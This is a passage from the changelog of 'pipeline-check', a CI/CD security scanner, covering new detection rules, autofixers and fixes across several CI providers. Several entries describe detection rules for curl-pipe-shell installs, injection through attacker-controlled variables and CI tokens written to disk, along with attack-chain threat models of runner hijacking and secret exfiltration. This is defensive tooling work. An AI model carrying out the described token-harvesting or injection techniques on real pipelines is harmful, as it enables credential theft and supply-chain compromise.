  flake8 + its transitive deps (mccabe, pycodestyle, pyflakes)
  from ``requirements-dev.txt``. Saves ~7 MB of installed
  dev environment.

- **`--explain` now resolves IDs from every rule pack.** The
  registry in ``pipeline_check.core.explain`` was only walking seven
  rule packages (github / gitlab / bitbucket / azure / jenkins /
  circleci / aws), so ``pipeline_check --explain K8S-001`` (and
  every Dockerfile, Cloud Build, Buildkite, Tekton, Argo ID) wrote
  ``Unknown check ID`` even though the rule modules ship full
  metadata. Added the missing six packs to ``_RULE_PACKAGES`` and a
  pair of regression tests in ``tests/test_cli_explain.py``: one
  walks the filesystem to enumerate every ``rules/`` directory and
  asserts each is registered, the other walks every discovered rule
  and asserts ``render(rule.id)`` exits 0 with the title in the body.
  A future contributor adding a new rule pack without updating
  ``_RULE_PACKAGES`` trips both at CI time.

- **Helm e2e test now skips on a flaky probe instead of failing.**
  GitHub-hosted Windows runners ship a chocolatey-shimmed
  ``helm.exe`` whose ``helm version --short`` invocation
  periodically hangs past 30s for reasons unrelated to scanner
  logic. ``test_render_and_scan_fixture_chart`` now wraps the
  ``render_chart`` call in a ``try / except HelmRenderError`` and
  skips with the probe error rather than reding the whole suite
  over a runner quirk. The pure-Python tests in the same file
  still cover the source-header parser and the K8s rule reuse,
  so the e2e test stays a "trust but verify" smoke check.

### Fixed

- **GHA-004 false positive on reusable-workflow callers.** A job that
  is a reusable-workflow caller (``jobs.<id>.uses:`` set, no
  ``steps:`` block) legitimately needs ``id-token: write`` to forward
  the OIDC token to the called workflow, but GHA-004 was inspecting
  the caller's empty step list and faulting it as "id-token: write
  with no OIDC step". The rule now skips the id-token check when
  ``job.uses`` is set. Surfaced by the new SLSA provenance job in
  ``release.yml``; would have FP'd on every project that calls
  ``slsa-github-generator`` or ``actions/attest-build-provenance``
  through a reusable workflow.
- **GHA-015 false positive on reusable-workflow callers.** GitHub
  Actions does not accept ``timeout-minutes:`` on jobs that call a
  reusable workflow, the called workflow's own jobs declare their
  timeouts. The rule was faulting reusable-workflow callers for
  missing an attribute that's structurally invalid on this job
  shape. Now skips callers identified by ``job.uses``.

## [0.4.2] - 2026-05-08

### Fixed

- **`pypi-publish.yml` SBOM path.** Same root cause as 0.4.1's
  `release.yml` fix, applied to the manual-fallback publish
  workflow. The CycloneDX step wrote `dist/sbom.cdx.json` next to
  the wheel, then ``gh-action-pypi-publish`` failed at ``twine
  check`` with ``InvalidDistribution: Unknown distribution format:
  'sbom.cdx.json'`` when v0.4.1 was dispatched through this path.
  SBOM now goes to ``sbom/sbom.cdx.json`` and uploads as a separate
  ``sbom`` artifact. v0.4.1 was never uploaded to PyPI either; 0.4.2
  is the first publishable tag of the 0.4 line whichever workflow
  the operator dispatches.

## [0.4.1] - 2026-05-08

### Fixed

- **`release.yml` SBOM path.** The CycloneDX step wrote
  `dist/sbom.cdx.json` next to the wheel and sdist, then
  `actions/upload-artifact` bundled the whole `dist/` tree as the
  ``dist`` artifact the publish jobs consume. ``gh-action-pypi-publish``
  runs ``twine check`` over the downloaded directory and rejects
  anything that isn't a wheel or sdist, so v0.4.0's TestPyPI publish
  failed with ``InvalidDistribution: Unknown distribution format:
  'sbom.cdx.json'``. The SBOM now goes to ``sbom/sbom.cdx.json`` and
  is uploaded as a separate ``sbom`` artifact; ``dist/`` stays
  publishable. v0.4.0 was never uploaded to PyPI, so this is the
  first publishable tag of the 0.4 line.

## [0.4.0] - 2026-05-07

### Added

- **Line-precise findings.** New ``Location`` dataclass on
  ``pipeline_check.Finding.locations`` carries ``path``,
  ``start_line`` / ``end_line``, ``start_column`` / ``end_column``,
  and ``doc_index`` (for multi-doc YAML). Backed by a new
  ``safe_load_yaml_lines`` loader that wraps PyYAML's
  ``construct_mapping`` / ``construct_sequence`` to attach source
  marks to every parsed dict and list. Multi-doc support via
  ``safe_load_all_with_lines`` for the K8s / Tekton / Argo / Helm
  providers. Loaders switched on every YAML provider; rule retrofits
  shipped for ``BK-001``, ``GCB-001``, ``GHA-001``, ``GHA-025``,
  ``GL-001``, ``BB-001``, ``ADO-001``, ``CC-003``, ``DF-001``,
  ``K8S-001``, ``TKN-001``, ``ARGO-001``. Reporters surface lines:
  terminal table renders ``path:line``, JSON adds ``locations``
  array (schema bumped to ``1.1``), SARIF emits structured
  ``result.locations`` with ``region.startLine`` /
  ``region.startColumn`` instead of the legacy
  ``_best_effort_line`` regex hack (kept as fallback for AWS / TF /
  CFN findings that have no source line). Cross-provider regression
  guard at ``tests/test_line_precision.py``.
- **PR-comment GitHub Action.** New composite action at
  ``.github/actions/pipeline-check-pr/`` runs the scanner on a
  pull request and posts review comments on the changed lines via
  ``GITHUB_TOKEN``. Maps each finding's ``Location.start_line`` to
  the matching PR diff hunk; findings whose line isn't part of the
  diff (or rules that don't emit structured locations) batch into
  a single PR-level summary comment. Idempotent: each comment
  carries a hidden marker so re-runs ``PATCH`` instead of
  duplicating, and obsolete bot comments get deleted when their
  finding disappears. Falls back to ``$GITHUB_STEP_SUMMARY`` when
  the runner token can't post (fork PRs with read-only token, rate
  limits, transient 5xx). Inputs:
  ``pipeline`` / ``path`` / ``severity-threshold`` /
  ``resolve-remote`` / ``comment-mode`` (per-finding | summary) /
  ``gh-token``. Composite (not Docker) for fast cold-start. No
  telemetry; only network calls are to the GitHub API of the
  hosting repo plus (with ``resolve-remote: true``) the GHA
  reusable-workflow resolver.
- **GitHub Actions reusable-workflow remote-ref resolver.**
  `--resolve-remote` (default off) follows
  ``jobs.<id>.uses: owner/repo/.github/workflows/x.yml@<sha>`` to the
  called workflow body and runs the full GHA rule pack against it
  with the caller's ``permissions:`` and ``secrets: inherit``
  context. Fetcher uses ``raw.githubusercontent.com`` with optional
  ``--gh-token`` (falls back to ``$GITHUB_TOKEN``); on-disk fallback
  via ``--gha-search-path`` (repeatable) for monorepos with sibling
  checkouts; per-ref cache under
  ``~/.cache/pipeline-check/gha-resolver`` with ``--no-cache`` to
  bypass; recursion depth capped at 3 (configurable via
  ``--gha-resolve-depth``, hard ceiling 10) with cycle detection;
  parallel fetches via a 4-worker pool. Only SHA-pinned refs are
  fetched (tag refs would defeat ``GHA-025``); unpinned refs are
  skipped with a warning. Findings on a resolved callee carry a
  synthetic ``<caller> -> <owner>/<repo>/<path>@<ref>`` resource
  string so reports attribute the issue to the caller's PR while
  pointing at the upstream body. ``GHA-004`` no longer fires on a
  callee whose caller declared a ``permissions:`` block; ``GHA-019``
  annotates findings with a ``(callee inherits caller secrets via
  secrets: inherit)`` note when the inherit flag is on. New shared
  ``uses_parser`` module replaces the ad-hoc ``rsplit("@", 1)`` calls
  in ``GHA-001`` and ``GHA-025``. No telemetry; resolution never
  fires without explicit opt-in. When ``--resolve-remote`` is off
  and remote refs are present, a one-line stderr warning lists how
  many were skipped so users discover the flag.
- **Three new providers — Buildkite, Tekton, Argo Workflows.**
  `--pipeline buildkite --buildkite-path .buildkite/pipeline.yml`
  scans Buildkite pipeline files (8 rules, BK-001..BK-008: plugin
  pinning, literal secrets in env, untrusted variable interpolation,
  curl-pipe-shell, ``docker --privileged``, missing
  ``timeout_in_minutes``, deploy step without a preceding ``block:``
  gate, TLS bypass). `--pipeline tekton --tekton-path PATH` scans
  Tekton CRDs filtered to ``apiVersion: tekton.dev/*`` (8 rules,
  TKN-001..TKN-008: step image digest pinning, privileged step,
  ``$(params.X)`` injection in step ``script:``, hostPath /
  host-namespace, literal secrets in env / param defaults, missing
  PipelineRun / TaskRun timeout, default ServiceAccount,
  curl-pipe-shell). `--pipeline argo --argo-path PATH` scans Argo
  Workflows CRDs filtered to ``apiVersion: argoproj.io/*`` (8 rules,
  ARGO-001..ARGO-008: template image digest pinning, privileged
  container, default ServiceAccount, hostPath / podSpecPatch
  host-namespace, ``{{inputs.parameters.X}}`` injection, literal
  secrets in env / parameter defaults, missing
  ``activeDeadlineSeconds``, curl-pipe-shell). Auto-detection picks
  Buildkite up on ``./.buildkite/pipeline.yml``. All three providers
  generate per-rule docs via ``scripts/gen_provider_docs.py``.
  Provider catalog: 13 to 16.
- **Custom rule DSL.** `--custom-rules PATH` (repeatable, also a
  `custom_rules:` config key) loads YAML-defined rules that plug
  into the same orchestrator as the built-in catalog. Loaded rules
  appear in findings, scoring, gating, SARIF, and `--explain`
  exactly like built-ins. Rule shape: `id` / `title` / `severity` /
  `provider` / `description` / `recommendation` / `for_each` /
  `assert`. Predicates compose via `eq` / `ne` / `regex` /
  `not_regex` / `in` / `not_in` / `exists` / `missing` / `gt` /
  `lt` / `gte` / `lte` / `len_*` leaves, plus `all_of` / `any_of` /
  `not` boolean glue. `for_each` is a small jsonpath subset (`$`,
  `.field`, `['key']`, `[N]`, `[*]`, `.*`) — rules describe the
  correct state and the engine surfaces violations as offenders.
  Description templates use `{{ name }}` placeholders that resolve
  against the iterated node first, falling back to ambient context
  (`kind`, `namespace`, `path`). Supported providers: `github`,
  `gitlab`, `bitbucket`, `azure`, `circleci`, `cloudbuild`,
  `kubernetes`. Helm rules ride on top of the K8s synthesized view
  (`$.workloads[*].containers[*]`), so a rule written once applies
  to both manifest and chart-rendered scans. ID format
  `^[A-Z][A-Z0-9]{1,9}-\d{3}$` enforced; collisions with built-in
  check IDs are rejected at load time. Authoring guide at
  `docs/writing_a_custom_rule.md` covers the per-provider doc shape
  and the predicate vocabulary.
- **Helm chart provider.** `--pipeline helm --helm-path <chart>`
  shells out to `helm template` (Helm 3) and runs the existing
  30-rule K8s pack on the rendered manifests. No HELM-* rules of
  its own — the value is coverage: most production K8s ships via
  Helm, so today's K8S-* checks finally apply to the bulk of real
  deployments rather than only to hand-written manifests in
  `k8s/`. `--helm-values FILE` and `--helm-set KEY=VALUE` are
  forwarded to helm's own flags and may be repeated. Auto-detects
  `./Chart.yaml` and `./charts/`. The `# Source:
  <chart>/templates/<file>.yaml` headers helm injects above each
  rendered doc are parsed and stored on `Manifest.source_template`,
  surfacing in inventory output and the public Python API. Helm 2
  is rejected on probe (EOL since Nov 2020). Render failures land
  in `ctx.warnings` and don't abort the scan; other charts in the
  same run continue. Provider catalog goes from 12 to 13.
- **One more attack chain — Caller-Controlled Runner with Token
  Persistence (GitLab).** `AC-014` is the GitLab parity for
  `AC-013`. Fires when both `GL-032` (``tags:`` interpolates an
  attacker-controllable CI variable) and `GL-020`
  (``CI_JOB_TOKEN`` / ``CI_DEPLOY_TOKEN`` /
  ``CI_REGISTRY_PASSWORD`` / ``CI_DEPLOY_PASSWORD`` written to
  persistent storage) trigger on the *same* ``.gitlab-ci.yml``.
  Same threat model as ``AC-013``: pipeline trigger picks the
  runner, pipeline drops a CI-managed token onto that runner's
  filesystem, attacker-controlled runner harvests the token.
  Severity CRITICAL, MITRE T1078 + T1552.001 + T1133. Recommendation
  closes either leg (hard-code ``tags:`` or stop writing tokens
  to disk). Chain catalog: 13 to 14.
- **One more attack chain — Caller-Controlled Runner with Token
  Persistence.** `AC-013` fires when both `GHA-036`
  (``runs-on:`` interpolates an attacker-controllable expression)
  and `GHA-019` (``GITHUB_TOKEN`` written to persistent storage)
  trigger on the *same* workflow file. The combo is a one-step
  credential delivery to an attacker-chosen runner: caller picks
  the runner, workflow drops its short-lived token onto that
  runner's filesystem, attacker reads the token and acts as the
  workflow inside the repo. Distinct from `AC-010` (non-ephemeral
  self-hosted + curl-pipe / token-persistence) — `AC-010` attacks
  any caller of the workflow once persistence lands; `AC-013` lets
  the *attacker* pick the runner directly. Severity CRITICAL,
  MITRE T1078 + T1552.001 + T1133, kill-chain
  initial-access -> credential-access -> exfiltration.
  Recommendation closes either leg (hard-code ``runs-on:`` or stop
  writing tokens to disk). Chain catalog: 12 to 13.
- **Four more autofixers** lifting the catalog from 96 to 100.
  Comment-only TODO fixers for the four runner-injection rules
  added this cycle: `GHA-036` (above each ``runs-on:`` line that
  inlines ``${{ inputs.* }}`` / ``${{ github.event.* }}``),
  `GL-032` (above each ``tags:`` line that inlines
  ``$CI_COMMIT_*`` / ``$CI_MERGE_REQUEST_*``), `ADO-030`
  (above each ``pool:`` / ``name:`` / ``demands:`` line that
  inlines ``$(Build.*)`` / ``$(System.PullRequest.*)`` /
  ``${{ parameters.X }}``), and `JF-032` (above each
  ``label "..."`` line that inlines ``${env.BRANCH_NAME}`` /
  ``${env.CHANGE_BRANCH}`` / ``${params.X}``). All four are
  comment-only — the right replacement is either a hard-coded
  label or an allowlist guard, neither of which the fixer can
  synthesize, so the marker points at the canonical shape.
  Idempotent (skip if the TODO is already present), no-op for
  benign cases (static labels, ``${{ matrix.* }}``, ``vmImage:``
  Microsoft-hosted, author-controlled ``${env.JOB_NAME}``). The
  Jenkins fixer emits a ``//`` Groovy comment instead of a
  ``#`` YAML comment so the marker parses in its native syntax.
- **One more Jenkins rule.** `JF-032` flags
  ``agent { label "..." }`` declarations whose label string
  interpolates an attacker-controllable Groovy expression
  (``${env.BRANCH_NAME}``, ``${env.CHANGE_BRANCH}``,
  ``${env.TAG_NAME}``, ``${params.X}``, …). Jenkins parity for
  ``GHA-036`` / ``GL-032`` / ``ADO-030``: whoever queues the
  build (or pushes the branch / opens the PR) picks which
  agent the job lands on, including any privileged label the
  controller exposes. Walks all four agent shapes — direct
  ``label``, the ``node { label … }`` form, and
  ``docker { label … }`` / ``dockerfile { label … }`` — via
  brace-balanced scan that handles nested DSL blocks correctly.
  Reuses the comment-stripped ``text_no_comments`` from the
  Jenkinsfile dataclass so a commented-out interpolation
  doesn't trip the rule. New ``LABEL_TAINT_RE`` in
  ``jenkins/rules/_helpers.py`` extends ``UNTRUSTED_ENV_RE``'s
  catalog with ``${params.X}``. Author-controlled
  ``${env.JOB_NAME}`` / ``${env.BUILD_NUMBER}`` are
  intentionally not flagged. Severity HIGH, OWASP CICD-SEC-7,
  CWE-345. Jenkins rule catalog: 31 to 32.
- **One more Azure DevOps rule.** `ADO-030` flags ``pool:`` /
  ``pool.name:`` / ``pool.demands:`` values that interpolate
  attacker-controllable input. Two surfaces: runtime SCM macros
  (`$(Build.SourceBranchName)`, `$(System.PullRequest.SourceBranch)`,
  …) and caller-controlled template parameters (`${{ parameters.X
  }}` — supplied by whoever queued the run). Azure DevOps parity
  for `GHA-036` / `GL-032`: a trigger or PR sender picks which
  agent pool the job lands on, including any privileged
  self-hosted pool the project exposes. Walks all three pool
  shapes — string scalar, dict `{ name, vmImage, demands }`, and
  the `demands` list / scalar form. ``vmImage`` is intentionally
  excluded (Microsoft-hosted, not a privileged-runner targeting
  surface). Pipeline variables defined in the workflow's own
  ``variables:`` block are author-controlled and not flagged.
  Severity HIGH, OWASP CICD-SEC-7, CWE-345. New
  `POOL_TAINT_RE` in `azure/rules/_helpers.py` combines
  `UNTRUSTED_VAR_RE`'s catalog with the literal
  `${{ parameters.X }}` pattern. Azure rule catalog: 29 to 30.
- **One more GitLab rule.** `GL-032` flags jobs whose `tags:`
  list interpolates an attacker-controllable CI variable
  (`$CI_COMMIT_REF_NAME`, `$CI_MERGE_REQUEST_TITLE`,
  `${CI_COMMIT_MESSAGE}`, …). GitLab parity for `GHA-036`: a
  pipeline trigger (or anyone whose PR title / branch name the
  workflow consumes) can route the job onto any tagged runner
  pool the instance exposes, including privileged self-managed
  tags like `deploy-prod` or `signer`. Reuses the same
  `UNTRUSTED_VAR_RE` catalog as `GL-002` so the predefined-
  variable list stays in lockstep. Static custom variables
  defined inside the pipeline file are intentionally not flagged
  (author-controlled, not attacker-controlled). Severity HIGH,
  OWASP CICD-SEC-7, CWE-345. Walks both ``tags:`` shapes
  (list of strings and the rare scalar form). GitLab rule
  catalog: 31 to 32.
- **One more GitHub Actions rule.** `GHA-036` flags jobs whose
  `runs-on:` interpolates an attacker-controllable expression
  (`${{ inputs.* }}`, `${{ github.event.* }}`,
  `${{ github.head_ref }}`, …). A reusable workflow that declares
  `runs-on: ${{ inputs.runner }}` lets a downstream caller route
  the job onto any self-hosted label the org owns — including
  privileged production-deploy fleets the workflow author never
  intended to expose. The rule walks all three `runs-on` shapes
  (string scalar, list of labels, and the long-form
  `{ group, labels }` dict) and reuses `UNTRUSTED_CONTEXT_RE` so
  the catalog stays in lockstep with `GHA-003` / `GHA-035`.
  `${{ matrix.* }}` is intentionally not flagged — matrix values
  are author-controlled, not caller-controlled. Severity HIGH,
  OWASP CICD-SEC-7, CWE-345. GitHub rule catalog: 35 to 36.
- **`disallow_any_generics` enabled** — cleared the final strict
  mypy flag with a 226 → 0 annotation pass. Bare `dict` / `list`
  return types and parameter annotations across the
  CloudFormation / Terraform IAM / S3 / ECR / CodeBuild /
  CodePipeline / CodeDeploy / pbac / extended / services modules
  now spell `dict[str, Any]` / `list[dict[str, Any]]` (CFN and
  Terraform planned-resource shapes are heterogeneous from
  upstream parsers, so `Any` is the honest leaf type). The Click
  `Choice` parameter became `Choice[str]`. The four AWS modules
  already exempted under the boto3 mypy override now also disable
  the `type-arg` error code so paginator wrappers don't have to
  spell `cast()` at every site. Two `dict[Any, Any]` sites
  (`_yaml_strict.DupKeyLoader.construct_mapping` and one PyYAML
  1.1 `True`-key lookup in `providers/github._gha_metadata`) keep
  the wider key type that PyYAML can produce in those corners.
  All nine `mypy --strict` flags are now on, with no user-visible
  change. The mechanical pass lives in
  `scripts/_fix_generics.py` and is safe to re-run.
- **Defensive fix for malformed grades in Lambda fan-out.**
  `lambda_handler._fan_out` no longer crashes when a sub-scan
  returns a grade outside `{A, B, C, D}` —  unknown grades
  collapse to `D` (the worst known) so the aggregate still
  surfaces the badness without raising `ValueError` from
  `_GRADE_ORDER.index`. New `test_lambda_fanout_tolerates_unknown_grade`
  pins the behavior. The error path that records a per-scan
  failure already used `continue`, so this only matters for the
  successful-but-malformed-result branch.
- **One more Bitbucket rule.** `BB-029` flags step `image:` and
  `definitions.services.<name>.image:` references that aren't
  pinned by sha256 digest. `BB-001` and `BB-009` only walk
  `pipe:` references inside `script:` lists; the actual runtime
  container (the step `image:`) and the auxiliary service
  containers were uncovered surfaces. Both ship code into the
  build context — a compromised service image (postgres,
  selenium-grid, …) can exfiltrate every secret the step
  touches as easily as the step image itself. Reuses the cross-
  provider `_primitives.image_pinning.classify` so the floating-
  tag semantics line up with `GHA-001` / `GL-001` / `JF-009` /
  `ADO-009` / `CC-003` / `K8S-001`. Handles the long-form
  `image: { name, run-as-user }` block too. Severity HIGH,
  OWASP CICD-SEC-3, NIST 800-53 SR-3 / SR-11 / SI-2. Bitbucket
  rule catalog: 28 to 29.
- **One more GitHub Actions rule.** `GHA-035` flags
  `actions/github-script@*` steps whose `with.script` input
  interpolates an attacker-controllable expression
  (`${{ github.event.* }}`, `${{ inputs.* }}`,
  `${{ github.head_ref }}`, `${{ github.ref_name }}`, …).
  `GHA-003` covers the same threat for `run:` blocks where
  shell expansion is the injection surface; `github-script` runs
  the interpolated value as Node.js inside an authenticated
  Octokit context, so backticks / quotes / `${...}` in a PR
  title break out of the surrounding string and execute against
  the workflow's `GITHUB_TOKEN`. The rule fires regardless of
  how the action is pinned — pinning closes the supply-chain
  leg but doesn't change the injection surface. Severity HIGH,
  OWASP CICD-SEC-4, CWE-94. Recommendation pushes callers
  toward the `env:` pattern (read via `process.env.X` instead of
  inline expansion). GitHub rule catalog: 34 to 35.
- **`disallow_untyped_defs` enabled** — cleared the final 22
  errors after the prior 67-function annotation pass: Click
  callbacks (`_load_config_callback`, `_install_completion_callback`,
  three `_complete_*` shell-completion helpers), drawer
  `iter_jobs` / `iter_steps` / `walk_strings` generator return
  types, AWS `ResourceCatalog._memo` (typed `loader: Callable[[],
  Any]`) and `AWSRuleChecks.__init__`, the YAML strict loader's
  `construct_mapping`, and the CFN `_target_key` /
  `_service_role_key` value-key helpers. This was the eighth of
  the nine `mypy --strict` flags; the ninth
  (`disallow_any_generics`) closed out in a separate landing
  documented above in this section.

### Changed

- **Architecture doc diagram is now a proper Mermaid flowchart**
  (`docs/architecture.md`) — the ASCII box-drawing version
  rendered poorly inside a `<pre>` block on Material's slate
  theme. Mermaid renders as crisp SVG, scales with the viewport,
  and color-codes the four phases (CLI edge, internal pipeline,
  Finding result, sink reporters) so the scan flow reads at a
  glance. Mermaid was already enabled via the existing
  `pymdownx.superfences` config; no extra dep.
- **Mobile drawer logo dropped** (`docs/stylesheets/extra.css`).
  The logo image inside `.md-sidebar--primary` was crowding the
  Pipeline-Check wordmark at the top of the slide-in drawer; the
  wordmark alone is unambiguous brand identification at the
  drawer width and the header still shows the logo.

- **Strict-mypy annotation pass** — annotated 67 of 89 functions
  flagged by `disallow_untyped_defs` (the prior pass that this
  flag-enable entry builds on). Two-thirds of the count was
  in terraform / cloudformation `phase3.py`, `phase4.py`,
  `services.py`, `extended.py`: ~25 helper functions of the shape
  `def _<service>(ctx) -> list[Finding]` got their `ctx` parameter
  annotated to the matching `TerraformContext` /
  `CloudFormationContext`. The seven YAML-provider orchestrators
  (`github/workflows.py`, `gitlab/pipelines.py`,
  `bitbucket/pipelines.py`, `azure/pipelines.py`,
  `circleci/pipelines.py`, `jenkins/jenkinsfile.py`,
  `cloudbuild/pipelines.py`, `dockerfile/pipelines.py`,
  `kubernetes/manifests.py`) `__init__` methods got
  `ctx: <Provider>Context, target: str | None = None`. Five
  primitive helpers (`as_list`, `parse_doc`, `_walk`,
  `_scan_values`, `_make_constructor`) got matching annotations
  with structural narrowing where needed (e.g. `parse_doc` now
  refuses non-string non-bytes input before calling `json.loads`,
  so the `dict` return type is honest). Remaining 22 errors live
  in `cli.py` callback shapes and a few smaller helpers; the
  `disallow_untyped_defs` flag flips on once those are cleared.
- **Two more strict mypy flags** (`disallow_subclassing_any` and
  `disallow_untyped_calls`). Five helpers got return annotations so
  the typed callers stop silently inheriting `Any`: `_parse`
  (`aws/rules/iam008_oidc_audience.py`), `_parse_policy`
  (terraform/services, terraform/extended, cloudformation/services,
  cloudformation/extended — same shape four places), `_first` and
  `_first_map` (terraform), `extract_pipe_ref`
  (`bitbucket/rules/_helpers.py`). Each helper now narrows
  `json.loads()` results structurally before returning so the
  `dict` return type holds even on malformed input. Two
  `yaml.SafeLoader` subclasses (`DupKeyLoader`, `_CfnSafeLoader`)
  are scoped through a per-module override since pyyaml ships
  without type stubs in our hash-locked lockfile.
  Strict-flag count: 6 of 9 (was 4 in v0.4.0); the remaining
  three (`disallow_any_generics`, `disallow_untyped_defs`,
  `warn_return_any` global) need ~300 mechanical annotations
  across the AWS / Terraform / CloudFormation rule packs.
- **One more Cloud Build rule.** `GCB-022` flags
  `options.substitutionOption: ALLOW_LOOSE`. Cloud Build's default
  is `MUST_MATCH` — undefined `$_VAR` references fail the build at
  parse time. The `ALLOW_LOOSE` opt-in collapses them to empty
  strings, papering over typos (`$_REGON`) and silently masking
  unset variables. Combined with `dynamicSubstitutions: true`
  (`GCB-004`) it widens the command-injection surface. Severity
  LOW (footgun rather than direct exploit). Ships with a
  drop-line autofixer that removes the explicit opt-in so the
  default takes over. Cloud Build rule catalog: 21 to 22; fixer
  catalog: 94 to 95.
- **Five more autofixers** lifting the catalog 89 to 94. *(a)*
  Drop-line for `K8S-028` (`hostPort: <N>`) — the host-IP binding
  is removed; the container's `containerPort` is unaffected.
  *(b)* Comment-only TODO for `K8S-029` (default-SA binding) above
  every `name: default` line in a subjects block. *(c)* Comment-
  only TODO for `K8S-030` (control-plane scheduling) above each
  `node-role.kubernetes.io/control-plane` (or legacy `master`)
  `nodeSelector` key OR `tolerations` `key:` line. *(d)* Comment-
  only TODO for `GHA-034` (`secrets: inherit`) pointing at the
  explicit-mapping shape. *(e)* Comment-only TODO for `GCB-021`
  (no private worker pool) above the `options:` block, suggesting
  the `pool.name` shape. None of the comment-only fixes mutate
  semantics — they leave a reviewable marker pointing at the
  right shape, since the right fix usually requires the operator
  to supply context the scanner can't synthesize (a named SA's
  manifest, a worker-pool resource path, an explicit secrets
  allowlist).
- **One more attack chain — Reusable Workflow Secret
  Exfiltration.** `AC-012` fires when both `GHA-025` (reusable
  workflow not pinned to commit SHA) and `GHA-034`
  (`secrets: inherit`) trigger on the *same* workflow file. The
  combo is a one-step credential exfiltration channel: the owner
  of the upstream repo can repoint the mutable tag to malicious
  code, and the next caller-side run hands every caller secret to
  that code under cover of normal reusable-workflow plumbing.
  Distinct from `AC-001` (fork-PR creds via `pull_request_target`)
  and `AC-009` (multi-finding repo poisoning). Severity CRITICAL,
  MITRE T1195.002 + T1552.001 + T1078. Chain catalog: 11 to 12.
- **Two more autofixers** — `DF-019` (`COPY` / `ADD` of a
  credential-shaped file) and `DF-020` (`ARG` declares a
  credential-named build argument) gain comment-only `TODO`
  patterns. Both rules need the operator to switch to
  `RUN --mount=type=secret`, which requires a build-time
  secret-id the autofixer can't synthesize, so the fix is a
  pointer comment rather than a transformative rewrite. The
  matchers mirror the rule's regexes (basename / path-tail /
  extension for DF-019; the shared `secret_shapes` regex for
  DF-020) so any rule-side update flows through automatically.
  Catalog grew 87 to 89.
- **One more GitHub Actions rule.** `GHA-034` flags reusable
  workflow calls that pass `secrets: inherit` instead of an
  explicit secret allowlist. Inheritance gives the called workflow
  every caller-defined secret — including ones it has no business
  reading — so a compromised or buggy reusable workflow can
  exfiltrate credentials the caller never intended to share.
  Distinct from `GHA-025`'s pin check: the inheritance problem
  exists even when the call is SHA-pinned, because the surface a
  compromised callee sees is determined by `secrets:`, not by the
  pin. Severity MEDIUM, OWASP CICD-SEC-2 + CICD-SEC-6.
  GitHub rule catalog: 33 to 34.
- **Dogfood self-scan cleanup.** Resolved twelve MEDIUM
  code-scanning alerts on this repo's own workflows
  (`release.yml`, `pypi-publish.yml`, `python-app.yml`,
  `docs.yml`, `localstack-test.yml`). The fix mix breaks down as:
  *(a)* engine improvements that closed real false-positive gaps
  — `GHA-004` now recognizes PyPI trusted publishing and other
  OIDC actions (Google WIF, Azure OIDC, Vault JWT, cosign keyless,
  attest-build-provenance, SLSA generators) as legitimate
  `id-token: write` consumers; `GHA-006` and `GHA-024` recognize
  PEP 740 attestations from `pypa/gh-action-pypi-publish` with
  `attestations: true`; `GHA-022`'s build-tool exemption grew to
  cover `build`, `pip-audit`, `cyclonedx-bom`, `cyclonedx-py`,
  `safety`, `bandit`, `semgrep`, `ruff`, `mypy` (CI scanners /
  build-system frontends, none of which ship inside the wheel);
  `_ARTIFACT_TOKENS` anchored `actions/upload-artifact@` so
  `actions/upload-pages-artifact@` no longer triggers the
  artifact-producer gate. *(b)* Real workflow hardening:
  `release.yml` and `pypi-publish.yml` now run `pip-audit`
  against the locked dep tree, generate a CycloneDX SBOM
  alongside the wheel, and pass `attestations: true` to the PyPI
  publish action so PEP 740 attestations are emitted. *(c)* A
  new `.pipelinecheckignore` documents the suppressions for the
  five remaining MEDIUMs that are legitimately not applicable
  (Pages site builds, LocalStack test placeholder credentials,
  test-report uploads, lint-tool inline installs).
- **Programmatic Python API.** `pipeline_check/__init__.py` now
  re-exports a small, stable surface so library callers can embed
  the scanner without `subprocess` + JSON parsing:
  `Scanner`, `ScanMetadata`, `Finding`, `Severity`, `Confidence`,
  `ControlRef`, `severity_rank`, `confidence_rank`, `score`,
  `ScoreResult`, `Chain`, `ChainRule`, `evaluate_chains`,
  `list_chain_rules`, `available_providers`,
  `available_standards`, `__version__`. `tests/test_public_api.py`
  locks the surface against accidental removal — adding a name is
  routine, removing one breaks the test (and is a semver-breaking
  change). README gained a "Python API" section with the canonical
  example.
- **Per-rule severity overrides in config.** New `overrides:` block in
  `.pipeline-check.yml` (and `[tool.pipeline_check.overrides.<id>]`
  in `pyproject.toml`) lets an org demote or promote a rule's
  severity without disabling it — the common SecOps ask "don't
  drop the rule, just downgrade it to LOW so the gate passes." The
  override flows through `core.config._parse_overrides` (with
  per-key validation and stderr warnings on bad severities or
  unknown sub-keys), gets stashed via `core.config.last_overrides()`
  out of click's `default_map`, and is applied by the Scanner after
  confidence resolution. Suppression remains the job of
  `--ignore-file` / `.pipelinecheckignore`; overrides change
  severity, not visibility. Documented under
  `docs/config.md#per-rule-overrides`.
- **Architecture and contributor docs.** Three new pages under
  `docs/`: `architecture.md` walks the scan flow (provider →
  context → orchestrator → rules → finding → scorer / gate /
  reporters); `writing_a_rule.md` documents the `RULE` + `check`
  module contract for adding a check to an existing provider;
  `writing_a_provider.md` covers adding a whole new provider end
  to end (context, orchestrator, registration, fixtures, doc
  generation, README claims). Wired into the docs nav under a new
  "Contributing" section.
- **Pre-commit hook integration.** `.pre-commit-hooks.yaml` ships
  one hook per provider (`pipeline-check-github`,
  `pipeline-check-dockerfile`, etc.) with a tight `files:` regex
  scoped to each provider's canonical paths, so a Dockerfile change
  doesn't run the GitHub Actions scanner. All hooks default to
  `--fail-on HIGH`. Users opt in via `.pre-commit-config.yaml` —
  see the new "Pre-commit" section in `README.md`.
- **Two more Cloud Build rules.** `GCB-020` flags an explicit
  `serviceAccount:` whose value still resolves to the project default
  Cloud Build SA email (`<project-number>@cloudbuild.gserviceaccount.com`,
  bare or wrapped in the `projects/<id>/serviceAccounts/...` URI).
  Complements `GCB-002` (which fires on the unset case); together
  they catch the "build inherits the default SA's broad roles"
  pattern whether the user forgot to set it or set it to the wrong
  value. `GCB-021` flags builds that don't bind to a private worker
  pool (`options.pool.name` or the legacy `options.workerPool`) —
  the prerequisite for VPC perimeter, egress filtering, and source-
  IP allowlists on internal endpoints. Cloud Build rule catalog:
  19 to 21.
- **Two more Kubernetes rules.** `K8S-029` flags `RoleBinding` and
  `ClusterRoleBinding` subjects that target a namespace's `default`
  ServiceAccount: every pod that omits `serviceAccountName` runs as
  that SA, so a binding to it grants the same verbs to every
  untargeted pod in the namespace (existing and future). `K8S-030`
  flags non-system workloads whose `nodeSelector` or `tolerations`
  target a control-plane node role label
  (`node-role.kubernetes.io/control-plane`, or the legacy `master`
  spelling); a pod scheduled there shares the kernel with the API
